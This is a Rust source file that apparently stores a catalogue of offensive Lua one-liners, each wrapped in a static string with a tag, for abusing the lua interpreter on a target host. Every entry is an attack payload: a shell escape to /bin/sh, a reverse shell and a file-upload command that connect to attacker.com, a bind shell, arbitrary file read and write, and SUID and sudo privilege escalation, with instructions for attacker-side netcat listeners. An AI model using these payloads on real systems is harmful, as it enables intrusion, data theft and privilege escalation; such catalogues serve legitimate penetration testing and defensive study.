pub static BIN_NAME: &'static str = "lua";
pub static SH_CODE: &'static str = r#"
    
    lua -e 'os.execute("/bin/sh")'
"#;
pub static NIRS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell. This requires `lua-socket` installed.";
pub static NIRS_CODE: &'static str = r#"
    
    export RHOST=attacker.com
    export RPORT=12345
    lua -e 'local s=require("socket");
      local t=assert(s.tcp());
      t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
      while true do
        local r,x=t:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));t:send(b);
      end;
      f:close();t:close();'
"#;
pub static NIBS_DESC: &'static str = "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.";
pub static NIBS_CODE: &'static str = r#"
    
    export LPORT=12345
    lua -e 'local k=require("socket");
      local s=assert(k.bind("*",os.getenv("LPORT")));
      local c=s:accept();
      while true do
        local r,x=c:receive();local f=assert(io.popen(r,"r"));
        local b=assert(f:read("*a"));c:send(b);
      end;c:close();f:close();'
"#;
pub static FU_DESC: &'static str = "Send a local file via TCP. Run `nc -l -p 12345 > 'file_to_save'` on the attacker box to collect the file. This requires `lua-socket` installed.";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_send
    lua -e '
      local f=io.open(os.getenv("LFILE"), 'rb')
      local d=f:read("*a")
      io.close(f);
      local s=require("socket");
      local t=assert(s.tcp());
      t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
      t:send(d);
      t:close();'
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via TCP. Run `nc target.com 12345 < 'file_to_send'` on the attacker box to send the file. This requires `lua-socket` installed.";
pub static FD_CODE: &'static str = r#"
    
    export LPORT=12345
    export LFILE=file_to_save
    lua -e 'local k=require("socket");
      local s=assert(k.bind("*",os.getenv("LPORT")));
      local c=s:accept();
      local d,x=c:receive("*a");
      c:close();
      local f=io.open(os.getenv("LFILE"), "wb");
      f:write(d);
      io.close(f);'
"#;
pub static FW_CODE: &'static str = r#"
    
    lua -e 'local f=io.open("file_to_write", "wb"); f:write("DATA"); io.close(f);'
"#;
pub static FR_CODE: &'static str = r#"
    
    lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which lua) .

    lua -e 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo lua -e 'os.execute("/bin/sh")'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which lua) .

    ./lua -e 'os.execute("/bin/sh")'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static NIRS: Code<'static> = Code {
    title: "NIRS_CODE",
    code: NIRS_CODE,
    tag: Tag::NIRS,
};
pub static NIBS: Code<'static> = Code {
    title: "NIBS_CODE",
    code: NIBS_CODE,
    tag: Tag::NIBS,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
